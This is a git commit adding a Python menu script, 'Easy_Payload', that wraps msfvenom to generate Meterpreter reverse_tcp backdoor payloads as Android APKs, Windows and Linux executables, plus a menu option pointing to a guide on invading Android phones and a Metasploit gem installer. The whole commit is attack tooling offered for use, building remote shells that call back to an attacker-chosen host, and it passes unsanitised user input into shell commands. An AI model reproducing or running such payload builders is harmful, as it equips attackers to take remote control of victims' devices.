d6edf78247d1d4f6cfc746e3816913f394693bb3
RyanGarccia <riangarccia8486@gmail.com>
2019-04-28 22:14:36 -0300

    Create Your Payload

---
+++ Easy_Payload.py
@@ -0,0 +1,254 @@
+# # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                                                     #
+#                  !/usr/bin/env python               #
+#                                                     #
+#           Script by:      #      Cybe®Bot_13        #
+#           Author:         #      RyanGarccia        #
+#           Team:           #      Cyberneticos       #
+#           Coding:         #      UTF-8              #
+#                                                     #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # #
+# ~>> Modulos <<~ #
+from os import system, path
+from time import sleep
+from sys import exit
+# ~>> Cores <<~~ #
+I = '\033[3m'
+W = '\033[1;37m'
+Y = '\033[1;33m'
+E = '\033[0m'
+G = '\033[92m'
+R = '\033[1;31m'
+# Defining Commands
+def clear():
+    system('clear')
+
+def First_Acess():
+    clear()
+    print ("""{4}
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░{2}█▀▀{4}░{2}█▀█{4}░{2}█▀▀{4}░{2}█{4}░{2}█{4}░░░░░{2}█▀█{4}░{2}█▀█{4}░{2}█{4}░{2}█{4}░{2}█{4}░░░{2}█▀█{4}░{2}█▀█{4}░{2}█▀▄{4}░░░░
+░░░░{2}█▀▀{4}░{2}█▀█{4}░{2}▀▀█{4}░░{2}█{4}░░░░░░{2}█▀▀{4}░{2}█▀█{4}░░{2}█{4}░░{2}█{4}░░░{2}█{4}░{2}█{4}░{2}█▀█{4}░{2}█{4}░{2}█{4}░░░░
+░░░░{2}▀▀▀{4}░{2}▀{4}░{2}▀{4}░{2}▀▀▀{4}░░{2}▀{4}░░{2}▀▀▀{4}░{2}▀{4}░░░{2}▀{4}░{2}▀{4}░░{2}▀{4}░░{2}▀▀▀{4}░{2}▀▀▀{4}░{2}▀{4}░{2}▀{4}░{2}▀▀{4}░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ v1.0 Beta ░
+-----------------[{2} Generate{1} Payload {4}]------------------
+---[{2} By:{1} RyanGarccia {4}]---------[ {2}Team{1} Cyberneticos {4}]---
+------------[{2} Feel the venom{1} in your vein {4}]------------
+    """.format(R, E, G, I, W))
+    system("termux-setup-storage")
+    system("mkdir /sdcard/EP_FILES")
+    system("mkdir /sdcard/EP_FILES/PDFs")
+    system("touch core/.init")
+
+def Old_Acess():
+    clear()
+    print ("""{4}
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░{2}█▀▀{4}░{2}█▀█{4}░{2}█▀▀{4}░{2}█{4}░{2}█{4}░░░░░{2}█▀█{4}░{2}█▀█{4}░{2}█{4}░{2}█{4}░{2}█{4}░░░{2}█▀█{4}░{2}█▀█{4}░{2}█▀▄{4}░░░░
+░░░░{2}█▀▀{4}░{2}█▀█{4}░{2}▀▀█{4}░░{2}█{4}░░░░░░{2}█▀▀{4}░{2}█▀█{4}░░{2}█{4}░░{2}█{4}░░░{2}█{4}░{2}█{4}░{2}█▀█{4}░{2}█{4}░{2}█{4}░░░░
+░░░░{2}▀▀▀{4}░{2}▀{4}░{2}▀{4}░{2}▀▀▀{4}░░{2}▀{4}░░{2}▀▀▀{4}░{2}▀{4}░░░{2}▀{4}░{2}▀{4}░░{2}▀{4}░░{2}▀▀▀{4}░{2}▀▀▀{4}░{2}▀{4}░{2}▀{4}░{2}▀▀{4}░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ v1.0 Beta ░
+-----------------[{2} Generate{1} Payload {4}]------------------
+
+ {2}[{4}1{2}]{4} Generate Payload
+ {2}[{4}2{2}]{4} How to invade an android on an external network.
+ {2}[{4}3{2}]{4} Resolve the Nokogiri Version 1.8.0 error
+ {2}[{4}4{2}]{4} Help
+ {2}[{4}5{2}]{4} About
+ {2}[{4}6{2}]{4} Exit
+
+    """.format(R, E, G, I, W))
+    Easy_Payload = input("{0}£asy_₱ayload ~> :{1} ".format(G, E))
+
+    if Easy_Payload == "1":
+        clear()
+        print ("""{4}
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░{2}█▀▀{4}░{2}█▀█{4}░{2}█▀▀{4}░{2}█{4}░{2}█{4}░░░░░{2}█▀█{4}░{2}█▀█{4}░{2}█{4}░{2}█{4}░{2}█{4}░░░{2}█▀█{4}░{2}█▀█{4}░{2}█▀▄{4}░░░░
+░░░░{2}█▀▀{4}░{2}█▀█{4}░{2}▀▀█{4}░░{2}█{4}░░░░░░{2}█▀▀{4}░{2}█▀█{4}░░{2}█{4}░░{2}█{4}░░░{2}█{4}░{2}█{4}░{2}█▀█{4}░{2}█{4}░{2}█{4}░░░░
+░░░░{2}▀▀▀{4}░{2}▀{4}░{2}▀{4}░{2}▀▀▀{4}░░{2}▀{4}░░{2}▀▀▀{4}░{2}▀{4}░░░{2}▀{4}░{2}▀{4}░░{2}▀{4}░░{2}▀▀▀{4}░{2}▀▀▀{4}░{2}▀{4}░{2}▀{4}░{2}▀▀{4}░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ v1.0 Beta ░
+-----------------[{2} Generate{1} Payload {4}]-----------------
+
+ {2}[{4}1{2}]{4} Generate payload for: {2}Android{1}
+ {2}[{4}2{2}]{4} Generate payload for: {2}Windows{1}
+ {2}[{4}3{2}]{4} Generate payload for: {2}Linux  {1}
+
+        """.format(R, E, G, I, W))
+        GeNeRaTe = input("{0}£asy_₱ayload ~> :{1} ".format(G, E))
+
+        if GeNeRaTe == "1":
+             print (" ")
+             LHOST = input("{0}S£T LHOST ~> :{1} ".format(G, E))
+             LPORT = input("{0}S£T LPORT ~> :{1} ".format(G, E))
+             NAME = input("{0}NAME OF APK FILE ~> :{1} ".format(G, E))
+             print (" ")
+             print ("This process may take a while...")
+             system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " --platform android R -o /sdcard/EP_FILES/" + NAME + ".apk")
+             print (" ")
+             print ("The " + NAME + ".apk file was successfully saved in the following directory: /sdcard/EP_FILES/")
+             print (" ")
+        elif GeNeRaTe == "2":
+             print (" ")
+             LHOST = input("{0}S£T LHOST ~> :{1} ".format(G, E))
+             LPORT = input("{0}S£T LPORT ~> :{1} ".format(G, E))
+             NAME = input("{0}NAME OF EXEC FILE ~> :{1} ".format(G, E))
+             print (" ")
+             print ("This process may take a while...")
+             system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " --platform windows > /sdcard/EP_FILES/" + NAME + ".exe")
+             print (" ")
+             print ("The " + NAME + ".exe file was successfully saved in the following directory: /sdcard/EP_FILES")
+             print (" ")
+        elif GeNeRaTe == "3":
+             print (" ")
+             LHOST = input("{0}S£T LHOST ~> :{1} ".format(G, E))
+             LPORT = input("{0}S£T LPORT ~> :{1} ".format(G, E))
+             NAME = input("{0}NAME OF EXE FILE ~> :{1} ".format(G, E))
+             print (" ")
+             print ("This process may take a while...")
+             system("msfvenom -p linux/ppc64le/meterpreter_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " --platform linux > /sdcard/EP_FILES/" + NAME + ".exe")
+             print (" ")
+             print ("The " + NAME + ".exe file was successfully saved in the following directory: /sdcard/EP_FILES")
+             print (" ")
+        else:
+             clear()
+             print (R+"                Ops!, Unknown platform...")
+             print (R+"       Choose between Android, Windows and MacOS")
+             sleep(4)
+             Old_Acess()
+
+    elif Easy_Payload == "2":
+        system("cp -r core/Hacking_World.pdf /sdcard/EP_FILES/PDFs > /dev/null 2>&1")
+        clear()
+        print (G+"    The PDF has been successfully moved to the folder: /sdcard/EP_Files/PDFs")
+        sleep(4)
+        Old_Acess()
+
+    elif Easy_Payload == "3":
+        clear()
+        print (G+"""
+     This process will solve the errors of the gems
+      that occurs it in the Metasploit-Framework.
+               Do youwant to continue?
+                     ~{Y}~{N}~
+        """)
+        Gems = input("{0}MsF ~> :{1} ".format(G, E))
+        if Gems == "Y" or Gems == "y":
+            clear()
+            print(G+"       Installing Gems for Metasploit-Framework")
+            print (" ")
+            system("cd && cd metasploit-framework")
+            system("pkg install ruby")
+            clear()
+            system("gem install nokogiri -v 1.8.0")
+            system("gem install rails-deprecated_sanitizer -v 1.0.3")
+            system("gem install rails-dom-testing -v 1.0.9")
+            system("gem install loofah -v 2.2.2")
+            system("gem install rails-html-sanitizer -v 1.0.4")
+            system("gem install actionview -v 4.2.10")
+            system("gem install actionpack -v 4.2.10")
+            system("gem install activemodel -v 4.2.10")
+            system("gem install activerecord -v 4.2.10")
+            system("gem install factory_girl -v 4.9.0")
+            system("gem install railties -v 4.2.10")
+            system("gem install factory_girl_rails -v 4.9.0")
+            system("gem install metasploit-concern -v 2.0.5")
+            system("gem install metasploit-model -v 2.0.4")
+            system("gem install postgres_ext -v 3.0.1")
+            system("gem install recog -v 2.1.20")
+            system("gem install metasploit_data_models -v 2.0.16")
+            system("gem install metasploit-credential -v 2.0.14")
+            system("gem install octokit -v 4.9.0")
+            system("gem install rex-bin_tools -v 0.1.4")
+            system("gem install rex-encoder -v 0.1.4")
+            system("gem install rex-exploitation -v 0.1.19")
+            system("gem install rex-nop -v 0.1.1")
+            system("gem install rex-powershell -v 0.1.78")
+            system("gem install xdr -v 2.0.0")
+            system("gem install rspec -v 3.7.0")
+            system("gem install rspec-rails -v 3.7.2")
+            system("gem install rspec-rerun -v 1.1.0")
+            clear()
+            print (G+"                Executing Msfconsole.")
+            system("./msfconsole")
+        else:
+            clear()
+            print (G+"              Ok! Restarting script.")
+            sleep(4)
+            Old_Acess()
+
+
+    elif Easy_Payload == "4":
+        clear()
+        print (G+"""
+
+#####     #####
+# Instalation #
+#####  ↓  #####
+
+$ git clone https://github.com/RyanGarccia/Easy-Payload
+$ cd Easy-Payload
+$ chmod +x *
+$ python Easy_Payload.py
+
+          The following tools are required
+              for the script execution.
+                         ↓
+```
+Python
+Ruby
+
+```
+Script by: RyanGarccia or Cybe®Bot_13
+
+        """)
+
+    elif Easy_Payload == "5":
+        clear()
+        print (G+"""
+
+     This script is based on information obtained by
+      users of Linux and Windows platforms, and by
+    information obtained through the msfvenom --help
+           command of Metasploit-Framework
+
+ Script by: RyanGarccia or Cybe®Bot_13
+
+                      WARNING!!!
+
+        This script is in the development phase
+
+                Project Collaborators:
+
+           ~> Cyber K7
+           ~> TheWorld (Site)
+
+Bye!!!
+
+        """)
+        exit(0)
+
+    elif Easy_Payload == "6":
+        clear()
+        print (W+"""
+░░░░░█▀▀░█▀▀░█▀▀░░░█░█░█▀█░█░█░░░█░░░█▀█░▀█▀░█▀▀░█▀▄░░░
+░░░░░▀▀█░█▀▀░█▀▀░░░░█░░█░█░█░█░░░█░░░█▀█░░█░░█▀▀░█▀▄░░░
+░░░░░▀▀▀░▀▀▀░▀▀▀░░░░▀░░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░░░
+        """)
+        exit(0)
+
+    else:
+        clear()
+        print (R+"""
+░░░░░█░█░░░░░█░█░░░█▀█░█▀█░▀█▀░░░█▀▀░█▀█░█░█░█▀█░█▀▄░░░
+░░░░░▄▀▄░░░░░▄▀▄░░░█░█░█░█░░█░░░░█▀▀░█░█░█░█░█░█░█░█░░░
+░░░░░▀░▀░▀▀▀░▀░▀░░░▀░▀░▀▀▀░░▀░░░░▀░░░▀▀▀░▀▀▀░▀░▀░▀▀░░░░
+          COMMAND NOT FOUND! RESTARTING...
+        """)
+        sleep(5)
+        Old_Acess()
+
+if path.isfile('core/.init') == False:
+    First_Acess()
+else:
+    Old_Acess()
---
+++ README.md
@@ -0,0 +1,7 @@
+~{ Version: 1.0
+~~{ Name: Easy_Payload
+~~~{ Coded by: RyanGarccia
+~~~~{ Plataform: Python
+~~~{ Language: English
+~~{ Date: 21/04/19
+~{ Beta: True
